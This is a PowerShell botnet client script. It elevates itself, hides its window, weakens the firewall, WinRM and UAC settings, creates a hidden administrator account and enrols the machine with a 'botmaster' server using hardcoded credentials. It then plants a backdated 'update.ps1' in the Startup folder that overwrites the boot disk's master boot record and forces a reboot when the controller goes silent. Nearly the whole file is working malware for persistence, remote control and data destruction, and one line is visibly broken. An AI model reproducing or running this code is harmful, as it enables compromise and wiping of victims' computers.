#first we elevate the script to admin level
# Get the ID and security principal of the current user account
$myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
$myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)

# Get the security principal for the Administrator role
$adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator

# Check to see if we are currently running "as Administrator"
if ($myWindowsPrincipal.IsInRole($adminRole)){
   # We are running "as Administrator" - so change the title and background color to indicate this
   $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Elevated)"
   $Host.UI.RawUI.BackgroundColor = "DarkBlue"
   clear-host
   }else{
   # We are not running "as Administrator" - so relaunch as administrator
   
   # Create a new process object that starts PowerShell
   $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
   
   # Specify the current script path and name as a parameter
   $newProcess.Arguments = $myInvocation.MyCommand.Definition;
   
   # Indicate that the process should be elevated
   $newProcess.Verb = "runas";
   
   # Start the new process
   [System.Diagnostics.Process]::Start($newProcess);
   
   # Exit from the current, unelevated, process
   exit
}
#hides powershell window
  $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
  add-type -name win -member $t -namespace native
  [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
#enables pinging 

  Import-Module NetSecurity
  Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-in)" -Enabled True
#adds all hosts to trusted hosts
 Set-Item wsman:\localhost\client\trustedhosts * -force
  #changes all networks to private to allow remoting 
    # Get network connections 
 $networkListManager = [Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]"{DCB00C01-570F-4A9B-8D69-199FDBA5723B}")) 
 $connections = $networkListManager.GetNetworkConnections()
  # Set network location to Private for all networks 
 $connections | % {$_.GetNetwork().SetCategory(1)}
 New-NetFirewallRule -DisplayName "Allow inbound TCP Port 443" -Direction Inbound -LocalPort 443 -Protocol TCP -Action Allow
 New-NetFirewallRule -DisplayName "Allow outbound TCP Port 443" -Direction Outbound -LocalPort 443 -Protocol TCP -Action Allow
 #enables remoting with powershell
 Enable-PSRemoting -Force
#restarts WinRM service to allow remoting
 Restart-Service WinRM -force
#creates a credintal object to use with invoke-command
 $compName = $env:COMPUTERNAME
 $Serverip = "192.168.1.130"
 $pwn = "password"
 $spwd = ConvertTo-SecureString -AsPlainText $pwn -Force
 $cred = New-Object -TypeName System.Management.Automation.PSCredential -argumentlist "botmaster",$spwd
 $myip = $(ipconfig | where {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1])
 #pings master and adds ip, host name , failed connect count to bot database loacted on host
 if(Test-Connection($Serverip) -Quiet ){
      Invoke-Command $Serverip -ScriptBlock{
      param($myip,$compName)
      if(!(Select-String -Pattern $myip -Path 'C:\Program Files\botlist.csv' -Quiet)){    
        Add-Content 'C:\Program Files\botlist.csv' -Value "$myip,$compName,0"}
      } -Credential $cred -ArgumentList $myip,$compName     
  }	
 #creates a user and adds them to administrator group to be used for remote commands
 Try{  
     $cn = [ADSI]"WinNT://$compname"
     $user = $cn.Create('User',"Admin")
     $user.SetPassword("UserPassw0rd123")
     $user.setinfo
     $user.DESCRIPTION = " "
     $user.setinfo
     $group = [ADSI]"WinNT://$env:COMPUTERNAME/Administrators,group"
     $group.Add("WinNT://$env:COMPUTERNAME/Admin,user")
 }Catch{
 }
    
  
#creates count file for deadman
Set-Content C:\count.txt -Value "0" 
#disables UAC prompts with registry key
Set-ItemProperty -Path registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
#makes powershellscripts run when double clicked
Set-ItemProperty -Path registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command\ -Name '(Default)' -Value '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoLogo -ExecutionPolicy unrestricted -file "%1"'

   
   
 
#add master check capabilites 
$checkcode = @'
   $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
   add-type -name win -member $t -namespace native
   [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
   $Serverip="192.168.1.130"
   $filename = "C:\count.txt"
   $count = Get-Content $filename -First 1
   $count = [convert]::ToInt32($count, 10)
#pings master if fails count is incremented and saved
#if count execceds 4 the MFT is overwritten
   $compName = $env:COMPUTERNAME
   $pwn = "password"
   $spwd = ConvertTo-SecureString -AsPlainText $pwn -Force
   $cred = New-Object -TypeName System.Management.Automation.PSCredential -argumentlist "botmaster",$spwd
   $myip = $(ipconfig | where {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1])
   
    if(Test-Connection($Serverip) -Quiet ){
        	Invoke-Command $Serverip -ScriptBlock{
        	param($myip,$compName)
        	If(!(Select-String -Pattern $myip -Path 'C:\Program Files\botlist.csv' -Quiet)){    
        	Add-Content 'C:\Program Files\botlist.csv' -Value "$myip,$compName,0"}
        	} -Credential $cred -ArgumentList $myip,$compName
		    $count=0
        	Set-Content -Path $filename -Value $count
    	}else{
        	$count++
            
        if($count -le 4){
          Set-Content -Path $filename -Value $count  
          }e
               $BootMessage = `'Bot Failed to connect, bot terminated`'

                if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
                {
                    throw 'This script must be executed from an elevated command prompt.'
                }

                #region define P/Invoke types dynamically
                $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
                $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)

                $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
                $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
                $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
                $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
                    @('kernel32.dll'),
                    [Reflection.FieldInfo[]]@($SetLastError),
                    @($True))

                # Define [Win32.Kernel32]::DeviceIoControl
                $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeviceIoControl',
                    'kernel32.dll',
                    ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                    [Reflection.CallingConventions]::Standard,
                    [Bool],
                    [Type[]]@([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto)
                $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

                # Define [Win32.Kernel32]::CreateFile
                $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CreateFile',
                    'kernel32.dll',
                    ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                    [Reflection.CallingConventions]::Standard,
                    [IntPtr],
                    [Type[]]@([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr]),
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Ansi)
                $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

                # Define [Win32.Kernel32]::WriteFile
                $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('WriteFile',
                    'kernel32.dll',
                    ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                    [Reflection.CallingConventions]::Standard,
                    [Bool],
                    [Type[]]@([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Ansi)
                $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

                # Define [Win32.Kernel32]::CloseHandle
                $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CloseHandle',
                    'kernel32.dll',
                    ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                    [Reflection.CallingConventions]::Standard,
                    [Bool],
                    [Type[]]@([IntPtr]),
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto)
                $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

                $Kernel32 = $TypeBuilder.CreateType()
                #endregion

                $LengthBytes = [BitConverter]::GetBytes(([Int16] ($BootMessage.Length + 5)))
                # Convert the boot message to a byte array
                $MessageBytes = [Text.Encoding]::ASCII.GetBytes(('PS > ' + $BootMessage))

                [Byte[]] $MBRInfectionCode = @(
                    0xb8, 0x12, 0x00,         # MOV  AX, 0x0012 ; CMD: Set video mode, ARG: text resolution 80x30, pixel resolution 640x480, colors 16/256K, VGA
                    0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set video mode
                    0xb8, 0x00, 0x0B,         # MOV  AX, 0x0B00 ; CMD: Set background color
                    0xbb, 0x01, 0x00,         # MOV  BX, 0x000F ; Background color: Blue
                    0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set background color
                    0xbd, 0x20, 0x7c,         # MOV  BP, 0x7C18 ; Offset to string: 0x7C00 (base of MBR code) + 0x20
                    0xb9) + $LengthBytes + @( # MOV  CX, 0x0018 ; String length
                    0xb8, 0x01, 0x13,         # MOV  AX, 0x1301 ; CMD: Write string, ARG: Assign BL attribute (color) to all characters
                    0xbb, 0x0f, 0x00,         # MOV  BX, 0x000F ; Page Num: 0, Color: White
                    0xba, 0x00, 0x00,         # MOV  DX, 0x0000 ; Row: 0, Column: 0
                    0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Write string
                    0xe2, 0xfe                # LOOP 0x16       ; Print all characters to the buffer
                    ) + $MessageBytes

                $MBRSize = [UInt32] 512

                if ($MBRInfectionCode.Length -gt ($MBRSize - 2))
                {
                    throw `"The size of the MBR infection code cannot exceed $($MBRSize - 2) bytes.`"
                }

                # Allocate 512 bytes for the MBR
                $MBRBytes = [Runtime.InteropServices.Marshal]::AllocHGlobal($MBRSize)

                # Zero-initialize the allocated unmanaged memory
                0..511 | % { [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, $_), 0) }

                [Runtime.InteropServices.Marshal]::Copy($MBRInfectionCode, 0, $MBRBytes, $MBRInfectionCode.Length)

                # Write boot record signature to the end of the MBR
                [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 2)), 0x55)
                [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 1)), 0xAA)

                # Get the device ID of the boot disk
                $DeviceID = Get-WmiObject -Class Win32_DiskDrive -Filter 'Index = 0' | Select-Object -ExpandProperty DeviceID

                $GENERIC_READWRITE = 0x80000000 -bor 0x40000000
                $FILE_SHARE_READWRITE = 2 -bor 1
                $OPEN_EXISTING = 3

                # Obtain a read handle to the raw disk
                $DriveHandle = $Kernel32::CreateFile($DeviceID, $GENERIC_READWRITE, $FILE_SHARE_READWRITE, 0, $OPEN_EXISTING, 0, 0)

                if ($DriveHandle -eq ([IntPtr] 0xFFFFFFFF))
                {
                    throw `"Unable to obtain read/write handle to $DeviceID`"
                }

                $BytesReturned = [UInt32] 0
                $BytesWritten =  [UInt32] 0
                $FSCTL_LOCK_VOLUME =   0x00090018
                $FSCTL_UNLOCK_VOLUME = 0x0009001C
                
                $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_LOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
                $null = $Kernel32::WriteFile($DriveHandle, $MBRBytes, $MBRSize, [Ref] $BytesWritten, 0)
                $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_UNLOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
                $null = $Kernel32::CloseHandle($DriveHandle)
                Start-Sleep -Seconds 2
                [Runtime.InteropServices.Marshal]::FreeHGlobal($MBRBytes)
                Write-Verbose 'Master boot record overwritten successfully.'          
                Restart-Computer -Force
                
            }
        }
      

'@         
#writes above code block to update.ps1 file in startup folder
set-content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1" "$checkcode"
#change file timestamps to match a C:\Windows 

$(Get-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1" ).creationtime=$(Get-Item C:\Windows).CreationTime
$(Get-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1").lastaccesstime=$(Get-Item C:\Windows).LastAccessTime
$(Get-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1").lastwritetime=$(Get-Item C:\Windows).LastWriteTime

#restarts computer to activate registry changes
Restart-Computer -Force

